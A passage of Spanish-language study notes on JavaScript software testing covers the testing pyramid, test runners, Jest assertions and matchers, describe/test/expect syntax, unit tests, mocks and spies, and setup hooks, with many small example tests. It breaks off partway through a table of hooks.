3. Cúspide (Nivel Superior): Pruebas End-to-End (E2E) o UI Tests
Esta es la capa más pequeña, reservada para los flujos de usuario más críticos.
Alcance: Simula la experiencia completa del usuario final en un entorno lo más parecido posible a la producción
(navegador real, servidor, base de datos). 
Prueba el sistema de principio a fin.
Velocidad: Lenta (dependen de la red, el rendering del navegador y el backend).
Costo: Alto (frágiles, difíciles de depurar y mantener).
##### Motivo de Uso: Asegurar que los flujos críticos de negocio, funcionen; Deben ser pocas y estratégicas
ej. "Iniciar Sesión y Comprar un Producto"
Herramientas Típicas: Cypress, Playwright, Selenium.


##### La forma de la pirámide (muchas pruebas unitarias, pocas E2E) refleja la relación inversa entre velocidad/costo y realismo/alcance

1. Velocidad: Las pruebas lentas (E2E) ralentizan el ciclo de desarrollo
Las pruebas rápidas (Unitarias) dan feedback instantáneo al desarrollador.

2. Aislamiento y Fiabilidad: Si una prueba E2E falla, es difícil saber dónde está el error
Si una prueba Unitaria falla, sabes exactamente qué función rompió la lógica.

3. Costo de Mantenimiento: Las pruebas E2E son caras y frágiles (cualquier cambio en la UI las rompe).
Las Unitarias son baratas y más estables


Anti-patrón: El "Cono de Helado":
Donde hay muchas pruebas E2E lentas y pocas o ninguna prueba unitaria. 

Esto lleva a:

1. Desarrollo Lento: Los desarrolladores tienen que esperar horas para que el suite de pruebas termine.
2. Alto Costo: Se gasta mucho tiempo manteniendo pruebas frágiles.
3. Mala Localización de Errores: Cuando algo falla, la causa es difícil de identificar.

##### La Pirámide de Pruebas asegura que los desarrolladores puedan confiar en las pruebas rápidas y baratas
dejando las pruebas E2E solo para confirmar la experiencia general.



### 2. Terminología Esencial:
Test Runner: La herramienta que ejecuta las pruebas (ej. Jest, Mocha).
Assertions (Aserciones): Declaraciones que verifican el resultado esperado (ej. expect(a).toBe(b)).
Test Suite y Test Case: Organización de las pruebas (describe y it/test).


#### Test Runner

Ejecutor de Pruebas, software o framework que se encarga de automatizar, ejecutar y reportar los resultados de tus pruebas de código.
Orquesta todo el proceso de testing.

El Test Runner es el motor que impulsa tu suite de prueba
Su trabajo es encontrar los archivos de prueba que has escrito
Cargarlos y ejecutar el código de prueba línea por línea, y comunicar si cada prueba pasó o falló.

Funciones: 

1. Descubrimiento
Localiza automáticamente todos los archivos de prueba en tu proyecto
(generalmente basados en convenciones de nomenclatura como .test.js o .spec.js).

2. Ejecución
Ejecuta el código de prueba en un entorno controlado
(a menudo imitando un navegador o el entorno Node.js).

3. Aislamiento
Ejecuta cada prueba en un entorno limpio para evitar que el resultado de una prueba afecte a otra.

4. Reporte
Muestra el resultado final en la consola
(verde para éxito, rojo para fallo)
genera resúmenes (ej. "100 pruebas ejecutadas, 98 pasaron, 2 fallaron").

5. Observación (Watch Mode)
Muchos Test Runners ofrecen el modo "vigilancia"
vuelven a ejecutar automáticamente las pruebas cada vez que guardas un cambio en tus archivos de código


Relación con el Code Base:

##### El Test Runner actúa como el intermediario entre tu código de producción y tu código de prueba.

1. Código de Producción: Las funciones que estás probando (ej. sumar(a, b)).
2. Código de Prueba: El archivo donde escribes tus pruebas (ej. test('sumar', () => { expect(sumar(1, 2)).toBe(3); })).
3. Test Runner: La herramienta que lee el código de prueba y llama a la función de producción, verificando las aserciones (expect).

Ej: en JS el framework de pruebas a menudo incluye al Test Runner

Jest: 
##### Framework "todo en uno" que incluye el runner, la librería de aserciones (expect), herramientas integradas para mocking y cobertura de código

Mocha:
Test Runner más simple y flexible
Requiere que integres librerías externas para las aserciones (ej. Chai) y el mocking (ej. Sinon).

Vitest:
Runner moderno y muy rápido, diseñado con la misma filosofía que Jest, pero optimizado para Vite y con un rendimiento superior.
 
Cypress / Playwright:
Aunque son principalmente herramientas de pruebas End-to-End (E2E)
Contienen sus propios runners especializados para ejecutar pruebas en un navegador real o headless

Comando: 
`npm test`
El Test Runner se activa para hacer que tu código de prueba cobre vida.


#### Assertions 

Parte práctica y legible de cualquier prueba de software.

##### Una aserción es una declaración sobre el estado esperado de tu código
##### Es la línea de código donde verificas si el resultado real de una operación coincide con el resultado que esperas que ocurra.
##### una aserción es la pregunta de sí/no que tu prueba le hace al código, y es lo que determina si la prueba pasa o falla.


Estructura: 

Sigue un patrón como: 

```
expect(valor_real).toBe(valor_esperado)
```

##### expect(valor_real): Tomas el valor que tu código produjo
##### toBe(valor_esperado): Usas un Matcher para comparar el valor real con el valor que debería haber sido.


Matcher:

##### Comparador es el corazón de la aserción, es el método que realiza la comparación
Los frameworks de pruebas ofrecen una amplia variedad de matchers para manejar diferentes tipos de comprobaciones.

Ej: matchers comunes en librerías como Jest

1. .toBe():
Comprueba si los valores son estrictamente iguales (usando ===).
Se usa principalmente para valores primitivos
(números, booleanos, strings).

```
expect(suma).toBe(5);
```

2. .toEqual():
Comprueba si dos objetos o arrays tienen la misma estructura y valores internamente
(es una igualdad profunda).
Crucial para objetos.

```
expect(usuario).toEqual({id: 1, nombre: 'Ana'});
```

3. .toBeTruthy():
Comprueba si el valor es truthy
##### (algo que JavaScript considera verdadero).

```
expect(resultado).toBeTruthy();
```

3. .toBeFalsy():
Comprueba si el valor es falsy
(algo que JavaScript considera falso, como 0, null, undefined, '').

```
expect(error).toBeFalsy();
```

4. .toBeDefined():
Comprueba si la variable no es undefined.

```
expect(fecha).toBeDefined();
```

5. .toHaveLength():
Comprueba la longitud de un array o string.

```
expect(lista).toHaveLength(3);
```

6. .toContain():
Comprueba si un array contiene un elemento específico.

```
expect(nombres).toContain('Pedro');
```

7. .toThrow():
Comprueba si una función lanza un error (excepción) cuando se ejecuta.

```
expect(() => funcionInvalida()).toThrow();
```


Ej Aserciones:
Imagina que tienes una función síncrona filtrar que toma un array de usuarios y devuelve solo los activos.

```
// Código de Producción:
function filtrarActivos(usuarios) {
  return usuarios.filter(u => u.activo === true);
}

// Código de Prueba (usando Aserciones):
test('debe devolver solo usuarios activos', () => {
  const usuarios = [
    { id: 1, activo: true },
    { id: 2, activo: false },
    { id: 3, activo: true },
  ];
  
  const activos = filtrarActivos(usuarios);

  // Aserción 1: Comprueba la longitud del resultado (2)
  expect(activos).toHaveLength(2); 

  // Aserción 2: Comprueba que el resultado es un array de objetos con los valores esperados
  expect(activos).toEqual([
    { id: 1, activo: true },
    { id: 3, activo: true },
  ]);
  
  // Aserción 3: Comprueba que el resultado contiene un ID específico (1)
  expect(activos.map(u => u.id)).toContain(1);
});
```

##### En este ejemplo, la prueba solo pasará si TODAS las aserciones son exitosas
##### Si, por ejemplo, filtrarActivos devolviera un usuario inactivo, la aserción .toHaveLength(2) o .toEqual([...]) fallaría, y el Test Runner reportaría el fallo.


##### Las aserciones son el objetivo de cada prueba
Sin ellas: 

1. prueba no hace nada: El código de la prueba se ejecutaría, pero nunca verificaría si el resultado es correcto
Si la función falla silenciosamente, la prueba seguirá "pasando".

2. Reporte Inútil: El Test Runner no sabría qué informar
Las aserciones le dicen al runner si debe mostrar el color verde ("Pass") o rojo ("Fail") y qué mensaje de error mostrar.


#### Test Suite y Test Case

Términos fundamentales utilizados para organizar y estructurar las pruebas en cualquier framework de testing
Representan una jerarquía lógica que hace que tus pruebas sean legibles, mantenibles y fáciles de reportar.

1. Test Case (Caso de Prueba)
Es la unidad de prueba más pequeña y atómica
Es un escenario de prueba individual que verifica una única pieza de funcionalidad o una condición específica

Alcance: 
Un Test Case se enfoca en un único resultado
"Verificar que la función de suma devuelve el valor correcto para números positivos".

##### Estructura: Típicamente consta de tres pasos (el patrón AAA: Arrange, Act, Assert):
Arrange (Preparar): Configurar los datos de entrada.
Act (Actuar): Ejecutar el código que se está probando.
Assert (Aserción): Declarar si el resultado real coincide con el esperado (usando expect().toBe()).

##### Sintaxis Común: Se define usando test() o it().


2. Test Suite (Suite de Pruebas)
Contenedor lógico que agrupa una colección de Test Cases relacionados.

Alcance:
Se enfoca típicamente en un componente, un módulo o una característica completa del sistema.
Agrupa casos de prueba que interactúan con el mismo código.

Propósito: Proporciona contexto
##### Cuando ves el reporte de pruebas, la Suite te dice qué parte del sistema fue probada.

Hooks:
Las Suites a menudo definen hooks de configuración y limpieza
(ej. beforeAll, afterEach) que se ejecutan antes o después de los casos de prueba dentro de esa Suite.

##### Sintaxis Común: Se define usando describe().

En el código: 
La relación es jerárquica
una Test Suite contiene uno o más Test Cases
Esta organización refleja el código de producción.

Ej: Módulo Calculadora.js

Jerarquía	Elemento	Propósito	Sintaxis de Jest/Mocha

Contenedor:
Test Suite
Prueba toda la funcionalidad de la Calculadora.
`describe('Calculadora', ...)`

Unidad:
Test Case
Prueba la función sumar con dos números positivos.
`test('debe sumar dos números', ...)`

Unidad:
Test Case
Prueba la función dividir entre cero (esperando un error).
```
test('debe lanzar error al dividir por cero', ...)
```

Ej de código testing

```
// La Suite de Pruebas: describe el módulo que estamos probando.
describe('Validación de Usuario', () => { 
    // Hooks: Se ejecuta una vez antes de todos los Test Cases en esta Suite.
    beforeAll(() => {
        // Inicializar una conexión a la base de datos de prueba
    });

    // Test Case 1: Prueba si la contraseña es demasiado corta.
    test('debe fallar si la contraseña tiene menos de 8 caracteres', () => { 
        // ARRANGE, ACT, ASSERT...
        expect(validar('abc')).toBe(false); 
    });

    // Test Case 2: Prueba si el usuario existe.
    test('debe devolver un error si el nombre de usuario ya está tomado', async () => { 
        // ARRANGE, ACT, ASSERT...
        await expect(registrarUsuario('admin')).rejects.toThrow('Usuario ya existe');
    });
    
    // Test Case 3: Prueba el caso exitoso.
    test('debe pasar con credenciales válidas', () => {
        expect(validar('Usuario123')).toBe(true);
    });
});
```

##### La claridad en esta estructura te permite ejecutar solo las pruebas relevantes y comprender inmediatamente, al leer el reporte de la consola, qué funcionalidad ha fallado.



### 3. Framework (ej. jest):
Instalación y configuración
Sintaxis básica: describe, test (o it), expect.

#### Jest: 
Se caracteriza por ser un framework de pruebas con "baterías incluidas".
A diferencia de otros runners más simples (como Mocha), Jest integra todas las herramientas necesarias para escribir y ejecutar pruebas sin la necesidad de instalar dependencias adicionales.

1. Componentes integrados

Test Runner:
Jest es el ejecutor. 
Se encarga de encontrar, cargar y ejecutar tus pruebas, y de generar los reportes de éxito/fracaso.

Aserciones (Matchers):
Incluye su propia potente librería de aserciones (expect().toBe(), expect().toEqual(), etc.), conocida por ser muy expresiva y legible.

Mocking y Spying:
Incluye herramientas nativas y sencillas (jest.fn(), jest.mock()) para simular dependencias externas
(como funciones, módulos o llamadas a API), manteniendo las pruebas aisladas.

Cobertura de Código:
Genera informes automáticos sobre qué porcentaje de tu código está cubierto por pruebas, sin necesidad de librerías de terceros (como Istanbul/nyc).


Características:

Velocidad y Rendimiento:
Excepcionalmente rápido
Utiliza el paralelismo para maximizar la velocidad:
Ejecución en Paralelo: Ejecuta pruebas en archivos separados al mismo tiempo utilizando múltiples procesos (workers).
Cache Inteligente: Solo vuelve a ejecutar las pruebas que están relacionadas con los archivos de código que has cambiado desde la última ejecución.

Snapshots Testing (Pruebas de Instantáneas):
Característica distintiva de Jest
Especialmente útil para probar componentes de interfaz de usuario (UI) o estructuras de datos complejas.
##### Captura el resultado actual de un componente (ej. la estructura HTML que renderiza) y lo guarda como un archivo de "instantánea" (.snap).
Verificación: En ejecuciones futuras, compara el nuevo resultado con la instantánea guardada
Si hay una discrepancia inesperada, la prueba falla, y el desarrollador debe aprobar el cambio intencional.


Entornos de Prueba (Environments):

Jest puede configurar diferentes entornos de ejecución:

jsdom (por defecto):
Simula el entorno del navegador
(DOM, window, document) sin necesidad de lanzar un navegador real
Esto es rápido e ideal para pruebas de componentes React/Vue/etc.

node:
Utilizado para probar código de backend o librerías que solo se ejecutan en Node.js.


Configuración:
A menudo solo una entrada en el archivo package.json.
No necesitas preocuparte por integrarlo con Babel o Webpack, ya que lo maneja internamente


Ej Matchers: 
La sintaxis de Jest es muy declarativa y fácil de leer:

```
const calculadora = require('./calculadora');

// Define la Test Suite
describe('Pruebas de Suma', () => { 

    // Define el Test Case
    test('La suma de 1 + 2 debe ser 3', () => { 
        const resultado = calculadora.sumar(1, 2);
        
        // La aserción: expect(valor_real).toBe(valor_esperado)
        expect(resultado).toBe(3); 
    });

    // Otro Test Case
    test('Debe lanzar un error si se pasa un string', () => {
        // Usamos el matcher toThrow para verificar la excepción
        expect(() => calculadora.sumar('a', 2)).toThrow(); 
    });
});
```



#### Describe: 
Organización y el contexto de tus pruebas.
Sirve para definir una Test Suite (Suite de Pruebas).

1. Propósito: Agrupar y Contextualizar
agrupar una colección de pruebas relacionadas, convirtiéndose en el contenedor lógico de tus Test Cases (test() o it()).

Organización Estructural:
describe() crea una jerarquía
Cada describe() se utiliza para

Un Módulo o Componente Completo:
Ej: describe('Componente de Carrito de Compras').

Clase o Función Específica:
Ej: describe('Clase Usuario').

Grupo de funciones relacionadas: 
describe('Manejo de Errores de API').


Contexto en el Reporte:
Los nombres que introduces en describe() se usan para dar contexto al reporte de la consola
Crucial cuando una prueba falla, ya que te dice exactamente qué parte del sistema falló.

Ej: Reporte (sin y con describe):
Sin describe: ✗ debe devolver 5
##### Con describe: ✗ Componente de Carrito de Compras > al añadir 2 productos debe devolver 5


2. Sintaxis y Parámetros
describe() es muy simple y requiere dos argumentos

name (string): Una cadena de texto que describe el grupo de pruebas
(Ej. 'Módulo de Autenticación').

##### fn (función): Una función callback que contiene todos los Test Cases (test() o it()) y potencialmente otros bloques describe() anidados

```
// Sintaxis básica
describe(name, fn);
```

Ej: 

```
// Archivo: calculadora.test.js

describe('Funciones Matemáticas Básicas', () => { // <--- Test Suite Principal
    
    // Test Case 1
    test('sumar debe devolver el resultado correcto', () => {
        expect(sumar(5, 3)).toBe(8);
    });

    // Test Case 2
    test('restar debe devolver un número negativo si el segundo es mayor', () => {
        expect(restar(5, 10)).toBe(-5);
    });
});
```


3. Hooks y Anidamiento

Configuración de Hooks:
##### describe() es el único lugar donde puedes definir Hooks (ganchos) de configuración y limpieza que se aplican a las pruebas dentro de esa suite

beforeAll(fn): Se ejecuta una vez antes de todos los test() dentro de la describe() actual.
(Ideal para inicializar una DB de prueba).

beforeEach(fn): Se ejecuta antes de cada test() individual dentro de la describe() actual.
(Ideal para reiniciar variables de estado).

afterAll(fn) / afterEach(fn): Hacen lo opuesto a sus contrapartes before.


Anidamiento de Bloques (Nested describe):

Puedes anidar bloques describe() para crear una estructura de pruebas aún más detallada
##### Es excelente para probar diferentes "estados" o "contextos" de un componente.

```
describe('Clase Cuenta Bancaria', () => { // Nivel 1: Clase
    
    // Hook que afecta a todos los tests en Nivel 1 y 2
    beforeEach(() => { /* Configuración para cada prueba */ });

    // Test Case del Nivel 1
    test('debe inicializar el saldo en cero', () => { ... });

    describe('cuando el saldo es insuficiente', () => { // Nivel 2: Contexto Específico
        
        // Test Case del Nivel 2
        test('debe lanzar un error al intentar retirar', () => {
            // ...
        });
        
        // Test Case del Nivel 2
        test('el saldo no debe cambiar después de un fallo', () => {
            // ...
        });
    });
});
```

Al anidar, el reporte de Jest combinará los nombres, resultando en algo como
##### Clase Cuenta Bancaria > cuando el saldo es insuficiente > debe lanzar un error al intentar retirar
Proporciona una claridad absoluta.


#### Test: 
Unidad fundamental para escribir cualquier prueba
Representa un Test Case (Caso de Prueba) individual.

1. Propósito: Prueba Individual
Es definir un escenario específico para verificar una única pieza de funcionalidad o una condición de tu código.

Definición de Test Case: Cada test() es un Caso de Prueba que se ejecuta de forma aislada.
##### Si un test() falla, no afecta a la ejecución de otros test() en el mismo archivo.

Contiene la Lógica AAA: El cuerpo de la función test() contiene los tres pasos críticos de cualquier prueba:

##### 1. Arrange (Preparar): Inicializar datos, mocks y variables.
##### 2. Act (Actuar): Ejecutar la función o el código que se está probando.
##### 3. Assert (Aserción): Usar expect() y matchers para verificar el resultado.


2. Sintaxis y Parámetros
Requiere dos argumentos principales:

name (string): Una cadena de texto que describe qué se está probando y cuál es el resultado esperado.
Debe ser legible y claro, a menudo comenzando con verbos como "debe", "debería", o "no debe".

fn (función): Una función callback donde resides el código real de la prueba, incluyendo la lógica AAA
##### Esta función puede ser asíncrona (async/await) si la lógica a probar lo requiere. 

```
// Sintaxis básica
test(name, fn); 
// Alias
it(name, fn);
```

Ej: 

```
const sumar = (a, b) => a + b;

// Test Case Síncrono
test('debe devolver la suma correcta de dos números positivos', () => {
    // Act
    const resultado = sumar(5, 7); 
    
    // Assert
    expect(resultado).toBe(12);
});
```


3. Asíncrono (async/await)

Una de las grandes ventajas de Jest es su excelente soporte para pruebas asíncronas

##### Si la función que estás probando devuelve una Promesa, simplemente declaras la función callback del test() como async y usas await para esperar la resolución.

```
// Función que devuelve una Promesa
async function obtenerDatos() {
  return new Promise(resolve => setTimeout(() => resolve({ id: 1 }), 100));
}

// Test Case Asíncrono
test('debe devolver un objeto con la propiedad id después de un retraso', async () => {
    // Act (Usamos await para esperar que la promesa se resuelva)
    const datos = await obtenerDatos(); 
    
    // Assert
    expect(datos).toEqual({ id: 1 });
});
```


4. Alias y Métodos Especiales

Jest ofrece otros métodos útiles

test.only(): Solo ejecutar esta prueba.
Muy útil para la depuración, ya que ignora todas las demás pruebas.

```
test.only('sólo esta...', () => { ... });
```

test.skip(): Saltar o ignorar esta prueba
Útil si una función aún no está implementada o si la prueba está rota temporalmente.

```
test.skip('saltar esta...', () => { ... });
```



#### Expect:

expect() es la columna vertebral de las Aserciones
inicio de toda verificación de prueba
herramienta que utilizas para describir el valor real que estás probando.
expect() toma el resultado de tu código y te permite encadenar un Matcher para verificar si cumple con la condición esperada

1. Propósito: envolver el valor que se está probando
##### exponer una serie de métodos de comparación, conocidos como Matchers.

expect()	
El valor real producido por el código.	
expect(suma(1, 2))

Matcher:
La condición o el tipo de comparación.
.toBe(3)


2. Sintaxis y Encadenamiento
##### expect(valorReal) devuelve un objeto especial que tiene todos los matchers disponibles como métodos (ej. .toBe, .toEqual, .toThrow).

```
const sumar = (a, b) => a + b;

test('la función sumar debe ser correcta', () => {
    // 1. Ejecutamos la función y pasamos el resultado a expect()
    const resultado = sumar(4, 5); 
    
    expect(resultado).toBe(9); // 2. Encadenamos el Matcher .toBe()
});
```


Modificador .not:
modificar casi cualquier matcher con .not para verificar lo contrario de la condición.

```
test('un array no debe ser nulo', () => {
    const lista = [];
    expect(lista).not.toBeNull();
});
```

Comprobaciones (Match-making):
##### La elección del matcher encadenado es crucial
determina la forma en que Jest compara los valores.

1. Igualdad Estricta (.toBe)
Utiliza el operador de igualdad estricta de JavaScript (===).
Solo debe usarse para valores primitivos (números, cadenas, booleanos).
`expect(2 + 2).toBe(4); // Pasa`

2. Igualdad Profunda (.toEqual)
Utiliza la igualdad recursiva (profunda) para comprobar si dos objetos o arrays tienen las mismas propiedades y valores, incluso si no son la misma instancia en memoria.
Importante: Nunca uses .toBe para objetos/arrays.

```
const usuario = { id: 1, nombre: 'Ana' };
expect(usuario).toEqual({ id: 1, nombre: 'Ana' }); // Pasa (mismos valores)

// expect(usuario).toBe({ id: 1, nombre: 'Ana' }); // Falla (diferentes instancias en memoria)
```

Comprobación de Propiedades (Asíncrono):
##### expect() también se usa para manejar resultados asíncronos y errores:

1. .resolves
Se utiliza para esperar que una Promesa se resuelva antes de aplicar un matcher.

```
await expect(fetchData()).resolves.toBeDefined();
```

2. .rejects
Se utiliza para esperar que una Promesa sea rechazada

```
await expect(fetchData()).rejects.toThrow('No encontrado');
```

3. .toThrow()
Se usa en funciones síncronas para verificar que se lance un error.

```
expect(() => dividir(1, 0)).toThrow();
```



#### To Be:
Matcher de Igualdad estricta entre el valor real y el valor esperado.

Encadena a la función expect() para afirmar que el valor que se está probando es exactamente el mismo que el valor esperado
Uso Principal: Valores Primitivos:
Números, Cadenas de texto (Strings), Booleanos (true, false), Valores especiales (null, undefined)

```
const resultadoSuma = 5 + 3;

test('la suma debe ser 8', () => {
    // Éxito: El número 8 es estrictamente igual al número 8
    expect(resultadoSuma).toBe(8); 
});

test('el valor debe ser verdadero', () => {
    expect(true).toBe(true);
});

test('la cadena de texto debe coincidir exactamente', () => {
    expect("Hola Mundo").toBe("Hola Mundo");
});
```


Cuándo NO Usar .toBe():
El error más común para los desarrolladores que comienzan con Jest es usar .toBe() para comparar objetos o arrays.

Falla con Objetos y Arrays:
En JavaScript, los objetos y los arrays son tipos de datos que se copian por referencia
Esto significa que dos objetos pueden tener exactamente las mismas propiedades y valores, pero nunca son estrictamente iguales (===) a menos que apunten al mismo lugar en la memoria.


##### Assertions es expect()


#### Matchers
El matcher es la regla de comparación
Convierte la aserción en una pregunta específica que tiene una respuesta binaria (Pasa/Falla).

Matcher	| Valor Real | Comparación | Valor Esperado | Resultado

1. .toBe(): 
5
¿Es estrictamente igual a? (===)
5
Pasa

2. .toEqual():
{id: 1}
¿Tiene la misma estructura que?
{id: 1}
Pasa

3. .toThrow()
Función
¿Lanza un error cuando se ejecuta?
(Ninguno o mensaje)
Pasa/Falla


Esenciales (Igualdad):
Estos matchers se centran en verificar la igualdad entre valores.

toBe(expected) (Igualdad Estricta):
Uso: Para valores primitivos (números, strings, booleanos, null, undefined).
Mecanismo: Usa el operador ===.
Advertencia: Falla con objetos o arrays porque compara la referencia en memoria.

```
test('la suma debe ser 10', () => {
    expect(5 + 5).toBe(10);
});
test('el valor debe ser nulo', () => {
    expect(null).toBeNull(); // .toBeNull() es un alias de .toBe(null)
});
```

toEqual(expected) (Igualdad Profunda)
Uso: Para objetos y arrays.
Mecanismo: Comprueba de forma recursiva (profunda) si cada propiedad y valor en el objeto o array real coincide con el esperado
independientemente de si son la misma instancia en memoria.

```
const usuario = { id: 1, activo: true };

test('el objeto de usuario debe coincidir con la estructura', () => {
    expect(usuario).toEqual({ id: 1, activo: true });
});
```

Matchers de Verdad y Falsedad (Truthy/Falsy):
##### Estos matchers evalúan la validez de un valor en el contexto de un if de JavaScript.

Matcher | Función |	Acepta Valores Como...

1. .toBeTruthy():
El valor es evaluado como verdadero.
Cualquier cosa excepto false, 0, "", null, undefined, NaN.

2. .toBeFalsy():
El valor es evaluado como falso.
false, 0, "", null, undefined, NaN.

3. .toBeDefined():
El valor no es undefined.
Cualquier cosa excepto undefined.

4. .toBeUndefined():
El valor es undefined.
Solo undefined.

```
test('el resultado debe ser truthy', () => {
    expect(1).toBeTruthy();
    expect("lleno").toBeDefined();
});
```


Matchers de Arrays y Propiedades
Para verificar la estructura o el contenido de colecciones.

1. .toHaveLength(number)
Verifica la longitud de un array o string.
`expect([1, 2, 3]).toHaveLength(3);`

2. .toContain(item)
Verifica si un array contiene un elemento específico.
`expect([1, 2, 3]).toContain(2);`

3. .toHaveProperty(key, value)
Verifica si un objeto tiene una propiedad específica y, opcionalmente, un valor.
`expect(user).toHaveProperty('id', 42);`


Matchers de Excepciones y Asincronía
##### Cruciales para el manejo de errores y pruebas asíncronas.

Excepciones (Síncronas):

1. .toThrow(error?): Verifica que una función lanza un error cuando se ejecuta. 
La función debe estar envuelta en una función callback
(como una función flecha) dentro del expect().

```
const dividir = (a, b) => { if (b === 0) throw new Error('Cero'); return a / b; };

test('debe lanzar error al dividir por cero', () => {
    // La función debe estar envuelta para que toThrow pueda capturar la excepción.
    expect(() => dividir(10, 0)).toThrow('Cero');
});
```


Asincronía (Promesas):

1. .resolves: Se antepone a otro matcher para esperar que la Promesa se resuelva.

2. .rejects: Se antepone a otro matcher para esperar que la Promesa se rechace.

```
test('la promesa debe resolverse con datos', async () => {
    await expect(fetchDatos()).resolves.toBeDefined();
});

test('la promesa debe rechazarse con un error', async () => {
    await expect(fetchDatosConError()).rejects.toThrow('Fallo de red');
});
```



## 2. Pruebas Unitarias (Unit Testing)

### 1. Alcance de una Unidad:
Probar la lógica de la unidad más pequeña y aislada de código (una función, un método de clase).
Asegurar que la función, dado un input, produce el output correcto o el efecto secundario esperado.


#### Unit test
verificación automatizada que se enfoca en la unidad más pequeña y aislada de código en tu aplicación.

Definición de unidad:
La "unidad" puede ser:

1. Una función individual (ej. sumar(a, b)).
2. Un método dentro de una clase.
3. Una clase completa. 
4. Un módulo que realiza una tarea específica.

El objetivo es confirmar que cada componente individual de tu sistema funciona correctamente según lo diseñado
bajo diversas condiciones de entrada.


Aislamiento:
Principio clave de las pruebas unitarias

##### Una prueba unitaria no debe depender de recursos externos.
##### No debe interactuar con la red, la base de datos, el sistema de archivos, o servicios externos (APIs de terceros).

##### Si una unidad depende de otra unidad (ej. Función A llama a Función B)
##### la dependencia se reemplaza por un mock o spy (simulación)
##### para garantizar que solo se pruebe la lógica de la unidad A.

Una prueba unitaria se adhiere al patrón AAA (Arrange, Act, Assert):

```
// Función a probar (la "unidad")
function calcularDescuento(precio, porcentaje) {
  if (porcentaje >= 1) { // Lógica de negocio
    return precio;
  }
  return precio * (1 - porcentaje);
}

// Prueba Unitaria con Jest
test('debe aplicar un 10% de descuento correctamente', () => {
  // 1. ARRANGE (Preparar)
  const precioOriginal = 100;
  const descuento = 0.10;
  
  // 2. ACT (Actuar)
  const precioFinal = calcularDescuento(precioOriginal, descuento);
  
  // 3. ASSERT (Aserción)
  expect(precioFinal).toBe(90); // Verificar el resultado esperado
});
```


Pirámide:

```
Manual test

ui test	
			(E2E)	(More Integration) / Slower
api test

Integration test

Component test

Unit test	(More Isolation) / Faster
```

El proyecto debe tener muchas más pruebas unitarias que pruebas de integración o End-to-End
Si el 90% de tus fallos se pueden detectar con pruebas unitarias rápidas, tu ciclo de desarrollo se vuelve mucho más eficiente.



### 2. Mocks, Spies y Stubs
Mocks: Objetos falsos que reemplazan dependencias externas (ej. llamadas a APIs, acceso a bases de datos) para aislar la unidad bajo prueba.
Spies: Observadores que envuelven una función existente para rastrear si fue llamada, cuántas veces y con qué argumentos.
Uso de jest.fn(), jest.mock(), y jest.spyOn().


#### Mocks
Simulacros, permiten aislar la unidad de código que estás probando
Reemplazando sus dependencias externas con sustitutos controlados.

Un Mock es un objeto o una función simulada que imita el comportamiento real de una dependencia
Su propósito es doble:

##### 1. Aislamiento: Evitar que la unidad de código a probar interactúe con el mundo exterior (bases de datos, APIs de red, sistema de archivos).
##### 2. Control: Permitir que el desarrollador defina exactamente qué resultado debe producir esa dependencia simulada
##### (ej. "cuando llames a la API, devuelve este error" o "devuelve estos datos específicos").

Problema de la Dependencia:
Imagina que estás probando una función obtenerPost():

```
function obtenerPost(id) {
  // Llama a una API real (DEPENDENCIA EXTERNA)
  return fetch(`/api/posts/${id}`); 
}
```

##### Si ejecutas una prueba unitaria de obtenerPost() sin mocks, la prueba sería:
##### Lenta: Tendría que esperar la respuesta de la red.
##### No Fiable: Fallaría si la red está caída o si la API real cambia su respuesta.
##### No Unitaria: Estaría probando la red y la API, no solo la lógica de tu función.

##### Solución con Mocks: Reemplazas la función fetch por un mock que, al ser llamado, devuelve una respuesta falsa e instantánea.


Mocks vs. Spies y Stubs (Tipos de Simulación):
El término "Mock" a menudo se usa de manera general para cualquier sustituto.
Sin embargo, en testing, existen distinciones técnicas:

Mock:
Simular la implementación.
##### Permite definir qué debe devolver la función simulada y, opcionalmente, verificar que fue llamada.

Spy (Espía):
Observar sin modificar.
##### Envuelve una función real y registra si fue llamada, con qué argumentos y cuántas veces, pero deja que la función real se ejecute.

Stub:
Sustituir la implementación.
##### Es una implementación mínima que siempre devuelve una respuesta codificada (hardcoded) para evitar que se ejecute la lógica real.

##### En Jest, la herramienta nativa jest.fn() actúa como una combinación muy flexible de los tres.


Mocks con Jest:
Jest ofrece una API muy fácil de usar para crear mocks.

1. Mockear Funciones Individuales (jest.fn())
##### Se usa para reemplazar funciones que están pasando como argumentos o que declaras tú mismo.

```
test('la función callback debe ser llamada una vez', () => {
    // 1. Arrange: Creamos un Mock
    const mockCallback = jest.fn(); 
    
    // 2. Act: Llamamos a la función que usa el callback
    ejecutarCallback(mockCallback);
    
    // 3. Assert: Verificamos si el Mock fue llamado
    expect(mockCallback).toHaveBeenCalledTimes(1); 
});
```

2. Mockear Implementaciones Específicas (.mockReturnValue())
##### Defines qué valor debe devolver la función simulada al ser llamada.

```
test('debe usar el valor simulado', () => {
    const mockObtenerPrecio = jest.fn();
    
    // El Mock siempre devolverá 100
    mockObtenerPrecio.mockReturnValue(100); 
    
    // Act: La función a probar llamará al Mock
    const precioFinal = procesarPrecio(mockObtenerPrecio); 
    
    expect(precioFinal).toBe(100); 
});
```

3. Mockear Módulos Enteros (jest.mock())
##### Se usa para simular módulos externos (ej. una librería de HTTP, un utility file).

```
// Archivo: __tests__/post.test.js
// Esto reemplaza el módulo 'axios' en cualquier sitio donde se importe
jest.mock('axios'); 

test('debe devolver los datos del post simulado', async () => {
    // Definimos qué debe devolver axios.get cuando sea llamado
    axios.get.mockResolvedValue({ data: { titulo: 'Simulado' } });

    const post = await obtenerPost(1);
    
    expect(post.titulo).toBe('Simulado');
    expect(axios.get).toHaveBeenCalledWith('/api/posts/1'); // Spy check
});
```


### 3. Setup y Teardown

Uso de funciones de hook (beforeAll, beforeEach, afterEach, afterAll) para inicializar y limpiar el estado antes y después de las pruebas.

##### Ejecutar código antes o después de la ejecución de tus Test Suites (describe) o Test Cases (test).

1. Propósito: 
##### Las pruebas, especialmente las unitarias y de integración, deben ser independientes
##### El resultado de una prueba no debe influir en el resultado de otra.
Los Hooks se aseguran de esto:

Configuración (Setup): Poner el entorno en el estado inicial requerido
(ej. crear un objeto de prueba, inicializar una base de datos simulada).

Limpieza (Teardown): Devolver el entorno a un estado limpio después de que las pruebas han terminado
(ej. eliminar datos creados, cerrar conexiones).


2. Tipos de Hooks
Jest proporciona cuatro funciones de hook principales
##### diferenciadas por si se ejecutan una vez (a nivel de Suite)
o antes/después de cada prueba (a nivel de Case).

#### Hook	Ejecución	Nivel de Ejecución	Uso Común

beforeAll(fn):
Una vez antes de que comience el primer test() de la Suite.
Suite (describe)
